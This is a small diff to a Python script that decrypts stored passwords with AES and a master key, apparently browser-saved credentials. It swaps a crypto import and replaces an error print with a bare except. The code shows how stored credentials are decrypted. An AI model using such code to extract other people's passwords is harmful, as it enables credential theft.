@@ -2,7 +2,7 @@ import os
 import json
 import base64
 import sys
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 import shutil
 
 def decrypt_payload(cipher, payload):
@@ -21,8 +21,7 @@ def decrypt_password(encrypted_password, master_key):
         decrypted_pass = decrypt_payload(cipher, payload)
         decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
         return decrypted_pass
-    except Exception as e:
-        print(e)
+    except:
         return "Unknown"
 
 
